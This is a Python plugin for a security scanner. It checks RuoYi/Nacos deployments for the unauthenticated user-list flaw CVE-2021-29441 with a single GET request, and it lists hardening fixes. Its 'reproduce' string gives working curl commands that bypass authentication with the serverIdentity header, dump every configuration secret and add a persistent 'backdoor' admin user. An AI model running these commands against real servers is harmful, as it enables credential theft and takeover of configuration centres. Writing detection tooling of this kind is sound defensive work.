# Nacos 未授权访问：若依集成 Nacos 配置中心，/nacos/v1/auth/users 未授权可获取用户列表
# 漏洞原因：Nacos 默认未开启身份认证（nacos.core.auth.enabled=false），
#   攻击者匿名访问 /nacos/v1/auth/users 即可获取全部用户名与密码哈希，
#   进而离线破解或直接利用默认密钥伪造 token 接管配置中心。
# 本插件仅做存在性验证：GET 用户列表接口，检测响应是否含真实 Nacos 用户列表特征。
# D4 改造（2026-07-18）：删除签名 marker，改真实响应特征判定，兼容签名靶场与真实 Nacos。
import json as _json

from common.models import STATUS_CONFIRMED, STATUS_SAFE, STATUS_UNKNOWN, ScanResult
from core.http import join_url
from lib.colors import no, ok
from lib.reporter import emit
from plugins.base import PluginBase


def _is_nacos_user_list(text):
    """判定响应是否为 Nacos 未授权用户列表真实响应

    真实 Nacos /nacos/v1/auth/users 未授权响应特征：
    - JSON 结构含 totalCount / pageItems（或 pageNumber / pageSize）
    - pageItems 数组含 username + password 字段（密码为 bcrypt 哈希 $2a$10$...）
    - 200 状态码（未授权可达）

    Returns:
        (hit: bool, evidence: str)
    """
    if not text:
        return False, "空响应"
    try:
        data = _json.loads(text)
    except (ValueError, TypeError):
        return False, "响应非 JSON"
    # JSON 顶层必须是对象：[]/[1,2]/"str"/123/null 都是合法 JSON，
    # 非 dict 时 `k in data`/`data.get` 会抛 TypeError/AttributeError 使插件崩溃，须显式拦截
    if not isinstance(data, dict):
        return False, "响应非 JSON 对象"

    # Nacos 用户列表响应含 totalCount + pageItems/pageNumbers 等分页字段
    # 用户数组：pageItems（新版）或 pageNumbers（旧版）
    users = data.get("pageItems") or data.get("pageNumbers") or []
    if not isinstance(users, list) or not users:
        return False, "JSON 无用户列表"

    # 每个用户条目应含 username + password 字段（Nacos 用户对象标准结构）
    has_user_fields = all(isinstance(u, dict) and "username" in u and "password" in u for u in users)
    if not has_user_fields:
        return False, "用户条目缺 username/password 字段"

    # 条目结构齐备即判定命中（历史缺陷：曾有 `has_pagination or has_user_fields` 的恒真条件——
    # 走到这里时 has_user_fields 必为 True，分页字段实际从未参与判定，属死逻辑）
    # 提取用户名列表作为证据（脱敏：不输出密码哈希）
    names = [u.get("username", "?") for u in users[:5]]
    return True, f"未授权获取用户列表：{names}"


class RuoyiNacosUnauthPlugin(PluginBase):
    name = "Nacos 未授权访问"
    cve = "CVE-2021-29441"
    severity = "medium"
    category = "vuln"
    description = (
        "若依集成 Nacos 配置中心，/nacos/v1/auth/users 未授权可获取用户列表，导致配置中心账号泄露，可进一步接管服务配置"
    )
    fix = (
        "开启 Nacos 身份认证（nacos.core.auth.enabled=true）；"
        "修改默认密钥；/nacos/** 路径强制鉴权；生产环境限制 Nacos 端口仅内网访问"
    )
    fix_detail = (
        "【升级方案】升级 Nacos 至 1.4.2+（修复 CVE-2021-29441 默认 token 绕过鉴权）\n"
        "【配置加固】application.properties 启用鉴权并修改默认 token：\n"
        "  nacos.core.auth.enabled=true\n"
        "  nacos.core.auth.plugin.nacos.token.secret.key=<自定义 Base64 密钥，至少 32 字节>\n"
        "【口令修改】修改 Nacos 控制台默认口令（nacos/nacos）：\n"
        '  curl -X PUT "http://nacos:8848/nacos/v1/auth/users" -d "username=nacos&newPassword=<强口令>"\n'
        "【网络隔离】Nacos 端口 8848 仅允许内网访问：\n"
        "  iptables -A INPUT -p tcp --dport 8848 ! -s 192.168.0.0/16 -j DROP\n"
        "【WAF 规则】拦截外网对 /nacos/v1/auth/users, /nacos/v1/cs/configs 的访问\n"
        "【合规】OWASP A05:2021 安全配置错误；等保 2.0 8.1.4 身份鉴别"
    )
    reproduce = (
        "# 1. 探测 Nacos 是否未授权可访问用户列表：\n"
        'curl "http://target:8848/nacos/v1/auth/users?pageNo=1&pageSize=10"\n'
        '  # 返回 JSON 含 "username" + "password" 字段即未授权\n'
        "\n"
        "# 2. 使用默认 serverIdentity 绕过鉴权（CVE-2021-29441）：\n"
        'curl -H "serverIdentity: identity" \\\n'
        '  "http://target:8848/nacos/v1/auth/users?pageNo=1&pageSize=10"\n'
        "\n"
        "# 3. 读取全部配置（含数据库密码、JWT 密钥等敏感信息）：\n"
        'curl "http://target:8848/nacos/v1/cs/configs?search=accurate&dataId=&group=&pageNo=1&pageSize=99" \\\n'
        '  -H "serverIdentity: identity"\n'
        "\n"
        "# 4. 添加管理员用户持久化权限（仅授权测试）：\n"
        'curl -X POST "http://target:8848/nacos/v1/auth/users" \\\n'
        '  -H "serverIdentity: identity" \\\n'
        '  -d "username=backdoor&password=Backdoor@123"'
    )
    # D2：Nacos 未授权全版本存在（取决于是否开启 nacos.core.auth.enabled）
    affected_versions = ""  # Nacos 未授权由组件版本决定（见 E2 组件检测），若依版本维度全适用
    # D12：CVSS v3.1 + 合规映射
    cvss_vector = "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"
    compliance = "等保2.0:8.1.4;OWASP:A01:2021"
    # D7: WAF 绕过支持
    vuln_type = "info_leak"
    supports_waf_bypass = True

    def verify(self, target, session):
        """GET /nacos/v1/auth/users 未授权用户列表接口，按真实响应特征判定

        @param target: 目标主机（可含端口），用于拼接接口地址
        @param session: 复用的 HTTP 会话对象
        @return: ScanResult——200 且响应含真实 Nacos 用户列表特征为 CONFIRMED，否则 SAFE
        """
        url = join_url(target, "/nacos/v1/auth/users?pageNo=1&pageSize=10")
        try:
            resp = session.get(url)
        except Exception as e:
            emit(no("Nacos 未授权访问（网络异常）"))
            return ScanResult(kind="vuln", name=self.name, status=STATUS_UNKNOWN, url=url, evidence=str(e))

        text = resp.text or ""
        code = getattr(resp, "status_code", 0)
        reason_200 = ""  # 200 时首次判据解析出的原因，SAFE 分支复用

        # 200 + 真实 Nacos 用户列表特征 → CONFIRMED
        if code == 200:
            hit, reason_200 = _is_nacos_user_list(text)
            if hit:
                emit(ok("存在 Nacos 未授权访问漏洞"))
                return ScanResult(
                    kind="vuln",
                    name=self.name,
                    severity=self.severity,
                    status=STATUS_CONFIRMED,
                    url=url,
                    evidence=reason_200,
                    fix=self.fix,
                )

        # 401/403 → 鉴权拦截；404 → 端点不存在；其余 → 无用户列表特征
        if code in (401, 403):
            reason = f"HTTP {code} 鉴权拦截"
        elif code == 404:
            reason = "HTTP 404 端点不存在"
        elif code == 200:
            # 复用上方首次解析结果，避免重复 JSON 解析
            reason = f"200 但{reason_200}"
        else:
            reason = f"HTTP {code} 非 200 响应"
        emit(no(f"不存在 Nacos 未授权访问漏洞（{reason}）"))
        return ScanResult(kind="vuln", name=self.name, status=STATUS_SAFE, url=url, evidence=reason)
